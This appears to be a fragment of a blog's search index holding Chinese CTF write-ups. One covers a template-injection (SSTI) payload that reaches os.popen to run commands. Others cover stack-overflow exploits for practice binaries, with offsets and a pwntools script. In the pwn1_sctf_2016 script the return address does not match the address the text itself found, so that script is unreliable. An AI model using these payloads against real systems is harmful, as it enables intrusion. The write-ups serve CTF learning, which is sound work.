class="hljs-string">&quot;__read__&quot;</span>//字符<br>ssti = <span class="hljs-string">&quot;&quot;</span><br>l= <span class="hljs-built_in">len</span>(code)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>    ssti += <span class="hljs-string">&quot;\\x&quot;</span> + <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(code[i]))[<span class="hljs-number">2</span>:]<br><span class="hljs-built_in">print</span>(ssti)<br><br></code></pre></td></tr></table></figure><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>得到了可用的的引用的列表</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/web/2023-01-13-191131.2t06z0t2nkow.jpg"></p><p>找到了object下的第71个类 &lt;class ‘site._Printer’&gt; ，调用os.popen函数执行命令</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[71].__init__.__globals__[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>括号内的使用base64用起来方便些，不用[];</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/web/2023-01-13-192925.jbcsey76zb.jpg"></p><p>发现了flag的存在，执行cat flag即可</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>周题</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn-第一周</title>
    <link href="/2023/01/10/pwn-%E7%AC%AC%E4%B8%80%E5%91%A8/"/>
    <url>/2023/01/10/pwn-%E7%AC%AC%E4%B8%80%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="rip1"><a href="#rip1" class="headerlink" title="rip1"></a>rip1</h1><p>1.检查文件</p><p>发现没有保护</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-10-212433.595hp4shcio0.jpg"></p><p>2.在ida中分析</p><p>发现gets函数可以无限读入，而s只存15个字符，则利用这个栈溢出漏洞。</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-10-205154.6q00gzdzu5mo.jpg"></p><p>在fun函数中发现system(“&#x2F;bin&#x2F;sh”),即是我们的目标</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/023-01-10-210655.3u5flldtpzr4.jpg"></p><p>找到fun的起始地址</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-10-205154.6q00gzdzu5mo.jpg"></p><p>3.写脚本</p><p>使用15个字符将s填满，在加上fun的起始地址后访问system(“.&#x2F;bin&#x2F;sh”)</p><p>照着网上的脚本写了一遍</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/3-01-10-211238.1tipzbi3la9s.jpg"></p><p>运行脚本，连接成功</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-10-211356.7a4phsm8tfnk.jpg"></p><h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h1><p>先checksec检查，没有保护</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-13-193051.73y2x26884jk.jpg"></p><p>在ida64中打开，shift+f12，发现system与cat flag.txt</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-14-230133.3kdits7jr7eo.jpg"></p><p>定位到cat flag.txt,获得cat flag.txt地址为0x400611</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-14-230238.27ae0sepu7b4.jpg"></p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-14-231850.jaduhnje71c.jpg"></p><p>找到主函数，发现存在危险函数gets,利用这个栈溢出漏洞。</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-14-231339.1pn74vj4oiw0.jpg"></p><p>写exp 0x40覆盖缓冲区，8覆盖BP的值</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-14-232331.75dvfktb1wxs.jpg"></p><p>拿到flag</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-14-232409.ab4kzv0vjb4.jpg"></p><h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><p>使用checksec检查，发现存在NX开启</p><p>NX缓解机制开启后，使某些内存区域不可执行，并使可执行区域不可写。</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-14-233617.45ktdgktx7k0.jpg"></p><p>在ida64中打开</p><p>根据主函数调用的func()中的代码，我们要使得v2的值为11.28125</p><p>我们需要将v2的值覆盖为11.28125（16进制0x41348000）</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-14-234138.6xln7db3q7pc.jpg"></p><p>写exp，0x30将v1覆盖后来到v2的位置</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-15-000301.4ojuzimtlgu8.jpg"></p><p>拿到flag</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-15-000301.4ojuzimtlgu8.jpg"></p><h1 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h1><p>使用checksec检查，发现存在NX开启</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-15-173106.1l8o5to32eao.jpg"></p><p>在ida32中发现cat flag.txt字符串</p><p>得到其函数地址为0x8048F0D</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-15-174403.554mxoyxdf4.jpg">找到关键函数，s只能输入32个字符，限制了溢出，不过在输入后字符I会被替换为you</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-15-175421.3yuzkwd9s8sg.jpg"></p><p>对于字符串s，需要填充0x3c(60)个字符在加4个字符才可以到达返回地址</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-15-180725.5xof26aphpc0.jpg"></p><p>写exp</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-built_in">io</span>=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26904</span>)<br><br>add=<span class="hljs-number">0x41348000</span><br>p=b<span class="hljs-string">&#x27;I&#x27;</span>*<span class="hljs-number">21</span>+b<span class="hljs-string">&#x27;a&#x27;</span> + p32(add)<br><span class="hljs-built_in">io</span>.sendline(p)<br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure><p>执行，拿到flag</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-15-182525.30xxpcu93ojk.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>周题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/01/01/hello/"/>
    <url>/2023/01/01/hello/</url>
    
    <content type="html"><![CDATA[<h1 id="hello"><a href="#hello" class="headerlink" title="hello"></a>hello</h1>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
